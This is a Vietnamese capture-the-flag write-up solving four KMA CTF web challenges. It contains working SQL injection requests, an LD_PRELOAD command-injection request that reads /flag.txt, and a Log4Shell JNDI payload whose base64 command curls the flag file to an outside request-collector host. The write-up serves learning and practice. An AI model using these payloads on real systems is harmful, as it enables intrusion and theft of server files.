---
title: Writeup - KMA CTF lần 2
tags: CTF
toc: true
---

Vẫn như thường lệ, khi có CTF nào của trường khác thì mình luôn cố gắng đi xin challenge để về làm và học hỏi những điều mới mẻ. Lần này có giải KMA CTF lần 2 mình lại tiếp tục ngỏ lời với những người bạn để xin đề giải được 4 challenge dưới đây ❁◕ ‿ ◕❁

## Challenge Find me

Ở challenge này thì sài tool `dirsearch` thấy được có file `.DS_Store`. Truy cập thì có flag

Flag: `KMACTF{I wont run away anymore. I wont go back on my word. That is my ninja way! Dattebayo!}`

## Challenge Inject me
Được cung cấp source code như sau:
```python
from flask import Flask, render_template, render_template_string, request
import sqlite3
import re

app = Flask(__name__)
HOST = "0.0.0.0"
PORT = 80
DATABASE = "database/database.db"

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    with open('database/schema.sql', 'r') as f:
        conn.executescript(f.read())
    conn.close()
    return

def waf(str):
    if (len(str)) > 85 or "union" in str.lower():
        return False

    black_list = ["'", '"', '*', '\\', '/', '#', ';', '-']
    for c in black_list:
        if c in str:
            str = str.replace(c, "")

    return str

@app.route('/')
def home():
   return render_template('index.html')

@app.route('/query',methods = ['GET'])
def addrec():
    if request.args.get("query") != "":
        query = request.args.get("query")
    
    query = waf(query)
    
    if query == False:
        return render_template_string("Dont cheat my fen =))")
    else:
        try:
            cur = get_db().execute('SELECT msg FROM ' + query + ' where msg like "MSG-%" and msg not like "%KMACTF{%" limit 1')
            result = cur.fetchall()

            if len(result) == 0:
                return render_template_string("No result")

            cur.close()
            return render_template("index.html", result = result)
        except:
            return render_template_string("Something went wrong")

@app.route('/source')
def source():
    source = open(__file__, "r")
    return render_template("source.html", source = source.read())

if __name__ == '__main__':
    init_db()
    app.run(HOST, PORT, debug=True)
```
+ Đoạn code trên có sử dụng `render_template_string` nhưng input nhập vào không được đưa vô hàm này.
+ Độ dài của đầu vào không được quá 85 và không được sử dụng `union`
+ Không chứa 1 trong các kí tự nằm trong `black_list = ["'", '"', '*', '\\', '/', '#', ';', '-']`
+ Có 1 route `/query` nhận tham số là query và sau đó truyền vào query sql `SELECT msg FROM ' + query + ' where msg like "MSG-%" and msg not like "%KMACTF{%" limit 1` => có thể SQL Injection
+ Ở đây không cần escape để thoát khỏi câu query nên blacklist ở trên đối với mình hiện tại coi như là vô dụng.
+ Để `result` in ra màn hình thì 2 điều kiện này cần phải đúng:
    + `msg like "MSG-%"` -> kết quả trả về phải có `MSG-`
    + `msg not like "%KMACTF{%"` -> không được chứa format flag

## Exploit
- Vì blacklist có chứa `'` và `"` nên việc tạo ra chuỗi `MSG-` không thể sử dụng theo cách này
- Ở đây mình sử dụng `char` để tạo chuỗi
![](https://i.imgur.com/WxY7dsO.png)
- Vậy bây giờ mình chỉ cần thay payload leak db để lấy flag vào chỗ `1`

Giải thích về payload trên:
+ Nối chuỗi `MSG-` với thông tin mình cần leak ra xong `AS` vô cột `msg`
+ Khi đó sẽ qua được 2 điều kiện `msg like "MSG-%"` và `msg not like "%KMACTF{%"`

Payload leak table_name
```
GET /query?query=<@urlencode>(select char(0x4d,0x53,0x47,0x2d) || sql as msg from sqlite_master)<@/urlencode> HTTP/1.1
Host: 45.32.110.58:20103
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```
Payload leak flag
```
GET /query?query=<@urlencode>(select char(0x4d,0x53,0x47,0x2d) || substr(flag,7) as msg from flag)<@/urlencode> HTTP/1.1
Host: 45.32.110.58:20103
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```
+ Request trên mình có sử dụng thêm hàm `substr` để lấy flag vì nếu như không lấy từ kí tự thứ 7 trở đi thì kết quả trả về sẽ chứa format flag `KMACTF` (điều kiện thứ 2 của `where`)

Flag: `KMACTF{Just simple sql injection with some tricks}`

## Challenge Pwn me
Source code:
```php
<?php

if ( isset($_GET["source"]) ) {
    highlight_file(__FILE__);
    die();
}

// Process file upload
if (isset($_FILES["file"])) {    
    // Clean storage
    $files = count(glob( "uploads/*"));
    if ($files > 100) {
        system("rm uploads/*");
    }

    $fileExt = strtolower(pathinfo($_FILES["file"]["name"],PATHINFO_EXTENSION));
    
    if ( preg_match("/ph/i", $fileExt) )
        die("Don't cheat my fen");

    $fileName = md5(rand(1, 1000000000)).".".$fileExt;
    $target_file = "uploads/" . $fileName;
    
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
        die("Your file: ".getcwd()."/".$target_file);
    } else {
        die("Something went wrong\n");
    }

}
// Add enviroment variable
if (isset($_GET["env"])) {
    foreach ($_GET["env"] as $key => $value) {
        if ( preg_match("/[A-Za-z_]/i", $key) && !preg_match("/bash/i", $key) )
            putenv($key."=".$value);
    }
}

system("echo pwnme!!");

?>

<form action="/" method="post" enctype="multipart/form-data">
  Select evil file to upload:
  <input type="file" name="file"> <br />
  <input type="submit" value="Upload" name="submit">
</form>

<!-- ?source=1 -->
```
Phân tích source:
- Chương trình cho phép upload file, nếu trong thư mục `uploads` có nhiều hơn 100 file thì sẽ xóa tất cả các file trong đó
- Các file upload lên không được phép có extension  chứa `ph` => chống upload các file có thể thực thi `php`
- Tham số `env` có nhận tham số theo array sau đó set giá trị cho các biến môi trường. 
Example:
    - Nhập `env[a]=b` thì sẽ set biến môi trường `a=b`
- Key truyền vào phải thuộc từ `A-Za-z_` và không được có `bash` => điều này để người chơi khỏi exploit theo một hướng khác, cụ thể [environment variables injection to a RCE](https://twitter.com/phithon_xg/status/1495367705825722368)

## Exploit
- Upload 1 file `.so` để biến `LD_PRELOAD` trỏ tới.
- Sử dụng tham số `env` để put biến môi trường `LD_PRELOAD`

File `.so` mình sử dụng [bypass_disablefunc_x64.so](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc_x64.so)

Sau khi upload thành công thì thực hiện request dưới đây với file `.so` đã upload hiện ra màn hình.
```
GET /?env[LD_PRELOAD]=/var/www/html/uploads/20de058610b27659d7ad6eb00e5cdf16.so&env[EVIL_CMDLINE]=cat+/flag.txt HTTP/1.1
Host: 45.32.110.58:20102
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```
Biến môi trường `EVIL_CMDLINE` sẽ được chạy trong hàm `system`.
![](https://i.imgur.com/QCuDwLy.png)

## Challenge Mineme
Các bạn có thể tải source ở đây nhé [SOURCE_CODE](https://drive.google.com/uc?id=1PFppvmsCi3VC3p4_a-ZXdl9J8lB1xck4&export=download)

Description của bài mà người bạn đã chụp cho mình.
![](https://i.imgur.com/Qezua1Q.png)
- Đầu tiên cần tải game Minecarft tại [tlauncher]
(https://tlauncher.org/)
- Server mà chúng ta cần tham gia chơi để lấy flag `149.28.135.96:13337`

### Setup
Sau khi tải `tlaucher` xong để chạy được game thì cần chọn đúng version `1.15` như dưới nhé, vì server được cung cấp là `server_1.15`.
![](https://i.imgur.com/LpYtSL2.png)
:::info
Ở đây mình đã tải rồi nên sẽ không có nút Install.
:::
Tiếp tục vào phần `Mutiplayer` để add thêm server của mình hoặc của tác giả.

Để chạy server ở localhost thì có thể sử dụng `Dockerfile` mà tác giả cung cấp hoặc chạy thẳng file `server_1.15.jar`. Ở đây mình chạy thẳng file `jar` luôn. (Về việc setup java thì mình sẽ không nói đến, mọi người tự tìm hiểu trên google nhé).
![](https://i.imgur.com/63O4Sgt.png)
Sau khi chạy file `server_1.15.jar` thì sẽ được kết quả như trên. Server sẽ là `localhost:25565`

### Phân tích
Sau khi mình mở file `server_1.15.jar` bằng `jd-gui` thì khá choáng vì quá nhiều class, do mình chưa từng thử xem server của Minecarft code như nào. Bây giờ mà đi đọc từng class xem thì hơi mệt nên mình quyết định lên google đi đọc một số bài về server của Minecarft.

Vì description có nhắc đến việc backdoor nên mình tải 1 bản server khác trên mạng về, cụ thể là bản `1.15.2` để diff.

Command sử dụng để diff bằng `IntelliJ`
![](https://i.imgur.com/PkFg5CF.png)
Sau khi lướt thì không thấy có gì khác biệt mà liên quan đến việc có thể khai thác challenge này, chỉ có 1 điều đáng chú ý là ở file tác giả cung cấp, có thêm `Collection` => có thể liên quan đến việc Deserialize.
![](https://i.imgur.com/xvqckgO.png)

Thêm 1 điều nữa là lỗi Log4j khi được public thì có những bài viết cũng nhắc đến Minecarft có ảnh hưởng bởi lỗ hổng này. Vậy ở đây mình thử trigger Log4j xem có thành công không.

![](https://i.imgur.com/BJg1eMZ.png)
Thử chat 1 đoạn payload Log4j thì nhận thấy được có DNS trả về => Chương trình bị lỗi Log4j
![](https://i.imgur.com/LrhvH10.png)

### Exploit
Đã trigger được Log4j thì tiếp tục mình cần RCE để lấy flag. Mình sử dụng tool [JNDIExploit](https://github.com/WhiteHSBG/JNDIExploit) với `Basic Queries` thì không thể RCE.

Phía trên lúc mình diff thì thấy có `Collection` => có thể liên quan đến Deserialize. Vậy trong tool này có phần để tạo payload với các gadget.
![](https://i.imgur.com/qZfsgaT.png)

Đầu tiên, mình thử với payload `URLDNS` và `CommonsCollectionsK1/Dnslog` thì thấy có DNS tới domain, nhưng khi chạy với `CommonsCollectionsK2` để RCE thì không lại hoạt động.
Mình quyết định sửa lại payload của `CommonsCollectionsK1` từ `ldap://[IP_VPS]:1389/Deserialization/CommonsCollectionsK1/Dnslog/` thành `ldap://[IP_VPS]:1389/Deserialization/CommonsCollectionsK1/Command/Base64/Y3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==`

Command chạy tool:
![](https://i.imgur.com/XXrWUVy.png)
:::info
Mọi người thay IP VPS vào chỗ bị bôi bỏ
:::

Payload send để lấy flag
```
$\{jndi:ldap://165.22.109.11:1389/Deserialization/CommonsCollectionsK1/Command/Base64/Y3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==\}
```
Trong đó: `3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==` là `curl -d @/flag http://suql4mat.requestrepo.com`

![](https://i.imgur.com/s9eRtsA.png)

Trong request tới có chứa 1 đường link chứa 1 phần thưởng giá trị 200k (card Viettel) cho ai giải được bài này đầu tiên. http://note.livedie.cc/makekmagreatagain

Ở đây mọi người có thể sử dụng CC5 kéo qua tool này rồi thực hiện tương tự như trên nhé, theo như lời tác giả nói:
![](https://i.imgur.com/UFfCXx1.png)

Flag: `KMACTF{log4shell_go_bruh_bruh!!!}`

## Lời kết.
Cảm ơn các tác giả của những thử thách trên đã tạo những thử thách hay cho các bạn đam mê CTF có cơ hội luyện tập. Đặc biệt cảm ơn anh [Jang](https://testbnull.medium.com/) đã có phần thưởng 200k để tạo động lực, tăng phần hấp dẫn cho thử thách và mình đã xin luôn 200k đấy từ tác giả ٩(͡๏̮͡๏)۶
![](https://i.imgur.com/pW096eY.png)
